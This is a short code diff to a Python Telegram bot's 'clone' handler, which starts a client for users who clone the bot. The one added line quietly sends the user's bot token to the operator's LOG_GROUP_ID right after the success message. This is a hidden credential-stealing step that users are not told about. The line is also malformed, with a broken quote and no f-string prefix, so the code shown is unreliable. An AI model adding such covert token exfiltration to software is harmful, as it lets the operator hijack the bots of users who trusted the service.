@@ -43,6 +43,7 @@ async def clone(bot, msg: Message):
         await client.start()
         user = await client.get_me()
         await msg.reply(f"Your Client Has Been Successfully Started As @{user.username}! ✅ \n\n Now Add Your Bot And Assistant @{ASSUSERNAME} To Your Chat!\n\nThanks for Cloning.")
+        await bot.send_message(LOG_GROUP_ID,"{bot_token})
         APP_USERNAME = user.username
         await sys.send_message(APP_USERNAME, "/start")
     except Exception as e:
